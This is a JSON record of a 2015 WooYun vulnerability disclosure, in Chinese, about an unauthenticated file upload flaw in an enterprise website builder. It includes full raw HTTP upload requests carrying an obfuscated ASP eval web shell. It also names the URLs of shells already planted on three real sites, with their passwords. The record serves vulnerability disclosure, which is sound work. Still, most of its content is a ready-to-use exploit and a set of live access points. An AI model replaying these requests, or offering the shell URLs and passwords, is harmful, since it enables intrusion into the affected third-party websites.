{"id": 41278, "wybug_id": "wooyun-2015-089352", "wybug_title": "某企业建站程序通用上传漏洞无需登录直接getshell", "wybug_corp": "一诺互联", "wybug_author": "Ch丶0nly", "wybug_date": "2015-01-04 12:36", "wybug_open_date": "2015-04-04 12:38", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["文件上传"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-04：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-04-04：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 某企业建站程序通用上传漏洞无需登录直接getshell 详细说明：  某企业建站程序通用上传漏洞无需登录直接getshellhttp://www.ynhl.net一诺互联是一家规模挺大的企业建站公司   案例有上万家网站(所以该漏洞是影响极大的)更多案例请参考：http://www.ynhl.net/case/   漏洞证明：  问题出在网站程序上的一个上传    更多案例请参考：http://www.ynhl.net/case/下面拿官网演示http://www.ynhl.net漏洞地址：http://www.ynhl.net/admin/fupload.asp?useForm=form1&prevImg=showImg&upUrl=tp&ImgS=&ImgW=&ImgH=&reItem=rePic上传过滤不全导致任意上传文件  前提是主要把目标站加入可信站点才能上传文件\n\n然后上传文件使用burp抓包 http://www.ynhl.net/admin/fupload.asp?useForm=form1&prevImg=showImg&upUrl=tp&ImgS=&ImgW=&ImgH=&reItem=rePic修改该处图片类型为asp\n\n附数据包：\nPOST /admin/fupaction.asp HTTP/1.1Accept: image/gif, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*Referer: http://www.ynhl.net/admin/fupload.asp?useForm=form1&prevImg=showImg&upUrl=tp&ImgS=&ImgW=&ImgH=&reItem=rePicAccept-Language: zh-cnUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727)Content-Type: multipart/form-data; boundary=---------------------------7de2902b3015aAccept-Encoding: gzip, deflateHost: www.ynhl.netContent-Length: 828Proxy-Connection: Keep-AlivePragma: no-cacheCookie: ASPSESSIONIDSCRQDTRR=BJCDJKGDHMFDAAKLGFHONOKE; bdshare_firstime=1419171865847; ASPSESSIONIDAASQCRST=MOGFKEJDPIKEBEFGJPCEFHPL; ASPSESSIONIDCARRCTTS=GAJPMOLDEIDBNGOCLGJECFPC; CNZZDATA5076377=cnzz_eid%3D1944653864-1419168501-http%253A%252F%252Fwww.baidu.com%252F%26ntime%3D1419215083-----------------------------7de2902b3015aContent-Disposition: form-data; name=\"upfile\"; filename=\"C:\\Documents and Settings\\Administrator\\×ÀÃæ\\asp.asp\"Content-Type: text/plain1<%eval\"\"&(\"e\"&\"v\"&\"a\"&\"l\"&\"(\"&\"r\"&\"e\"&\"q\"&\"u\"&\"e\"&\"s\"&\"t\"&\"(\"&\"0\"&\"-\"&\"2\"&\"-\"&\"5\"&\")\"&\")\")%>-----------------------------7de2902b3015aContent-Disposition: form-data; name=\"Submit\"¿ªÊ¼ÉÏ´«-----------------------------7de2902b3015aContent-Disposition: form-data; name=\"useForm\"form1-----------------------------7de2902b3015aContent-Disposition: form-data; name=\"upUrl\"tp-----------------------------7de2902b3015aContent-Disposition: form-data; name=\"prevImg\"showImg-----------------------------7de2902b3015aContent-Disposition: form-data; name=\"reItem\"rePic-----------------------------7de2902b3015a--\n\n\n如上图已经看到上传成功了 http://www.ynhl.net/admin/tp/asp0.asp 密码-7http://www.bohome.cn/admin/tp/1111.asp  密码cai\n\nhttp://www.lubeian.com.cn/tp/1111.asp 密码-7\n\n\nPOST /fupaction.asp HTTP/1.1Accept: image/gif, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*Referer: http://www.lubeian.com.cn/fupload.asp?useForm=form1&prevImg=showImg&upUrl=tp&ImgS=&ImgW=&ImgH=&reItem=rePicAccept-Language: zh-cnUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727)Content-Type: multipart/form-data; boundary=---------------------------7de3d83a290590Accept-Encoding: gzip, deflateHost: www.lubeian.com.cnContent-Length: 835Proxy-Connection: Keep-AlivePragma: no-cacheCookie: ASPSESSIONIDASTQBBAB=CPIBHBABLCDPDAFFBEJKMOJE-----------------------------7de3d83a290590Content-Disposition: form-data; name=\"upfile\"; filename=\"C:\\Documents and Settings\\Administrator\\×ÀÃæ\\1111.asp\"Content-Type: text/plain<%eval\"\"&(\"e\"&\"v\"&\"a\"&\"l\"&\"(\"&\"r\"&\"e\"&\"q\"&\"u\"&\"e\"&\"s\"&\"t\"&\"(\"&\"0\"&\"-\"&\"2\"&\"-\"&\"5\"&\")\"&\")\")%>-----------------------------7de3d83a290590Content-Disposition: form-data; name=\"Submit\"¿ªÊ¼ÉÏ´«-----------------------------7de3d83a290590Content-Disposition: form-data; name=\"useForm\"form1-----------------------------7de3d83a290590Content-Disposition: form-data; name=\"upUrl\"tp-----------------------------7de3d83a290590Content-Disposition: form-data; name=\"prevImg\"showImg-----------------------------7de3d83a290590Content-Disposition: form-data; name=\"reItem\"rePic-----------------------------7de3d83a290590--\n更多案例请参考：http://www.ynhl.net/case/   修复方案：  过滤   版权声明：转载请注明来源 Ch丶0nly@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}